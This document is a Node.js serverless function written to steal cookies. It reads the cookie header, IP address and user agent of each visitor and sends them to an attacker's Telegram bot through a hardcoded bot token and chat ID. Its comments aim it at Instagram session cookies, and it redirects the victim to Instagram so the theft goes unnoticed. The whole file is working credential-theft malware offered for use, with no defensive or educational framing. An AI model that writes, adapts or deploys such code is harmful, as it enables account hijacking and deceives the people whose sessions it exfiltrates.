const fetch = require("node-fetch");

const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
const TELEGRAM_CHAT_ID = "8569746095";

exports.handler = async (event, context) => {
    // 1. Get the cookies from the incoming request
    // When the user visits this function, their browser sends Instagram cookies 
    // IF they are already logged in to Instagram in that browser.
    const cookies = event.headers.cookie || "";
    
    // 2. Prepare Telegram message
    const timestamp = new Date().toISOString();
    const userAgent = event.headers["user-agent"] || "Unknown";
    const ip = event.headers["x-forwarded-for"] || event.headers["x-real-ip"] || "Unknown";

    const message = `
🍪 <b>Instagram HttpOnly Cookie Logged!</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${ip}
📱 <b>User Agent:</b> <code>${userAgent}</code>

🍪 <b>Cookies (HttpOnly + Non-HttpOnly):</b>
<code>${cookies}</code>
    `;

    // 3. Send to Telegram
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "HTML"
            })
        });
    } catch (error) {
        console.error("Telegram Error:", error);
    }

    // 4. Redirect to Instagram
    // This makes the user think they are just visiting Instagram
    return {
        statusCode: 302,
        headers: {
            Location: "https://www.instagram.com/"
        },
        body: ""
    };
};